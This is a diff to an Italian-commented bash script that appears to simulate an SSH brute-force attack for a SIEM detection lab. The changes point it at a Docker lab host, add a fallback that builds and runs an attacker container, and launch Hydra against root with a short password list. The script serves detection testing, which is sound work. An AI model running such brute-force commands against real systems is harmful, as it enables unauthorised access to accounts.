@@ -10,12 +10,14 @@
 # ============================================================
 set -euo pipefail
 
-TARGET="${1:-192.168.56.10}"   # IP target (default: rete lab Vagrant)
-PORT="${2:-22}"
-WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"
-USER="root"
+TARGET="${1:-172.20.0.10}"   # IP target (Docker lab — 172.20.0.10)
+PORT="${2:-2222}"
+ATTACKER_IMG="${ATTACKER_IMG:-siem-attacker}"
 
 RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'; NC='\033[0m'
+
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+SCRIPT_NAME="$(basename "${BASH_SOURCE[0]}")"
 
 banner() {
   echo -e "${YLW}"
@@ -26,10 +28,33 @@ banner() {
   echo -e "${NC}"
 }
 
+# Build and exec into Docker attacker container if tools are missing
+_docker_fallback() {
+  if ! docker image inspect "${ATTACKER_IMG}" >/dev/null 2>&1; then
+    echo -e "${YLW}[Docker] Building attacker image (first run ~2 min)...${NC}"
+    docker build -q -t "${ATTACKER_IMG}" "${SCRIPT_DIR}/"
+  fi
+  echo -e "${YLW}[Docker] Running ${SCRIPT_NAME} in attacker container...${NC}"
+  exec docker run --rm \
+    --network siem-net \
+    -v "${SCRIPT_DIR}:/simulations:ro" \
+    "${ATTACKER_IMG}" \
+    bash "/simulations/${SCRIPT_NAME}" "$TARGET" "$PORT"
+}
+
 check_tools() {
+  local missing=()
   for t in hydra nmap; do
-    command -v "$t" >/dev/null 2>&1 || { echo -e "${RED}Manca: $t${NC}"; exit 1; }
+    command -v "$t" >/dev/null 2>&1 || missing+=("$t")
   done
+  if [ ${#missing[@]} -gt 0 ]; then
+    echo -e "${YLW}Strumenti mancanti: ${missing[*]}${NC}"
+    if command -v docker >/dev/null 2>&1; then
+      _docker_fallback
+    fi
+    echo -e "${RED}Installa: apt install hydra nmap  (o usa: make build-attacker)${NC}"
+    exit 1
+  fi
 }
 
 step() { echo -e "\n${GRN}[►] $*${NC}"; }
@@ -53,7 +78,7 @@ TMPLIST=$(mktemp /tmp/passlist.XXXX)
 printf '%s\n' "${COMMON_PASS[@]}" > "$TMPLIST"
 
 echo -e "${YLW}Lanciando Hydra contro $TARGET:$PORT (demo lista ridotta)...${NC}"
-hydra -l "$USER" -P "$TMPLIST" \
+hydra -l root -P "$TMPLIST" \
   -t 4 -s "$PORT" \
   -o /tmp/hydra-brute-result.txt \
   ssh://"$TARGET" 2>&1 | tail -20
